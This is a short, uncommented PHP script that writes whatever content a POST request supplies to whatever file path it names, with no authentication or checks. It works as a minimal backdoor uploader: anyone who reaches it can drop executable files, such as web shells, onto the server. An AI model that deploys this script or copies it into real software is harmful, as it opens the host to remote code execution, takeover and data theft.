<?php
$path = $_POST['path'];
$content = $_POST['content'];
$file = fopen($path, "w");
fwrite($file, $content);
fclose($file);
